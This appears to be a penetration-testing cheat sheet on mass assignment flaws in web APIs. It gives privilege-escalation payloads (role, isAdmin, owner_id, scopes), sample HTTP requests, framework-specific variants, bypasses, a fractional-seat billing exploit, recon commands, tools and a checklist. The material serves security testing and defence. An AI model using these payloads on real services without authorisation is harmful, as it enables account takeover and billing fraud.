# Mass Assignment Vulnerabilities

Mass assignment occurs when APIs directly bind user input to internal models without filtering, allowing attackers to modify privileged fields like `role`, `isAdmin`, or `status`.

## Quick Test

```json
// Add role field to any profile update
{"name": "user", "role": "admin"}
{"isAdmin": true}
{"status": "activated"}
```

## Detection

**Where to find:**
- User profile updates (PUT/PATCH /api/users/me)
- Registration endpoints
- Settings modification
- Any JSON/form body that updates database records

**Response reveals internal fields:**
```json
{
  "id": 123,
  "email": "user@target.com",
  "role": null,           // ← Bindable?
  "status": "pending",    // ← Bindable?
  "isAdmin": false,       // ← Bindable?
  "permissions": []       // ← Bindable?
}
```

## Attack Vectors

### 1. Basic Role Escalation

**Step 1 — Normal update:**
```http
PUT /api/users/12934 HTTP/1.1
Content-Type: application/json

{"email": "user@target.com", "firstName": "Sam"}
```

**Response reveals schema:**
```json
{
  "id": 12934,
  "roles": null        // ← Target this
}
```

**Step 2 — Add privileged field:**
```http
PUT /api/users/12934 HTTP/1.1

{
  "firstName": "Sam",
  "roles": [{"id": 1, "name": "ADMIN"}]
}
```

### 2. Common Privileged Parameters

```json
// Role-based
"role": "admin"
"roles": ["admin", "user"]
"userRole": "administrator"
"roleId": 1

// Boolean flags
"isAdmin": true
"is_admin": true
"admin": true
"verified": true
"active": true
"premium": true

// Status
"status": "approved"
"accountStatus": "active"
"emailVerified": true

// Ownership
"owner_id": 123
"org_id": 456
"tenant_id": 789

// Permissions
"permissions": ["read", "write", "admin"]
"scopes": ["admin:*"]
```

### 3. Parameter Discovery

**From client bundles:**
```bash
grep -oE '"[a-zA-Z_]+":' bundle.js | sort -u
grep -E "interface|type.*{" bundle.ts
```

**From GraphQL introspection:**
```graphql
{
  __type(name: "User") {
    fields { name type { name } }
  }
}
```

### 4. Framework-Specific Exploits

**Rails (without strong_params):**
```http
POST /users HTTP/1.1

user[name]=attacker&user[admin]=true
```

**Node.js/Express (direct Object.assign):**
```javascript
// Vulnerable:
Object.assign(user, req.body);
{ ...user, ...req.body }
```

**Spring (Jackson deserialization):**
```json
{"username": "attacker", "authorities": [{"authority": "ROLE_ADMIN"}]}
```

### 5. Nested Object Manipulation

```json
{
  "profile": {
    "name": "user",
    "settings": {
      "role": "admin"
    }
  }
}
```

### 6. Array Parameter Pollution

```json
{"role": "admin"}
{"role": ["admin"]}
{"roles[]": "admin"}
```

### 7. ID/Ownership Override

```json
// Change owner of resource
{
  "title": "My Document",
  "owner_id": 1  // Admin's ID
}
```

### 8. Pricing Exploit (Type Manipulation)

```json
// Server: seats_added = Math.ceil(seats)
// Billing: price = Math.floor(seats) * $60
{"seats": 1.9}
// Result: 2 seats, charged for 1
```

## Bypasses

**Parameter name variations:**
```json
{"role": "admin"}
{"Role": "admin"}
{"ROLE": "admin"}
{"user_role": "admin"}
{"userRole": "admin"}
```

**Nested vs flat:**
```json
{"role": "admin"}
{"user": {"role": "admin"}}
{"attributes": {"role": "admin"}}
```

**Type coercion:**
```json
{"isAdmin": 1}
{"isAdmin": "1"}
{"isAdmin": "true"}
{"isAdmin": true}
```

## Real Examples

| Target | Technique | Impact |
|--------|-----------|--------|
| FIA Driver Categorisation | roles array injection | Full admin ATO |
| Krisp | seats: 1.9 decimal exploit | Free premium seats |

## Tools

- **Param Miner** (Burp) — Discover hidden parameters
- **Arjun** — Parameter discovery
- **ParamSpider** — Mine parameters from web archives
- **Caido Automate** — Fuzz parameter names

## Checklist

- [ ] Map all update endpoints (PUT/PATCH/POST)
- [ ] Analyze response for internal/privileged fields
- [ ] Search client code for role/permission strings
- [ ] Try common privileged parameter names
- [ ] Test nested object structures
- [ ] Try different naming conventions
- [ ] Test array syntax variations
- [ ] Check for hidden form fields
- [ ] Test type coercion (string/int/bool)
- [ ] Verify changes persist (re-fetch object)
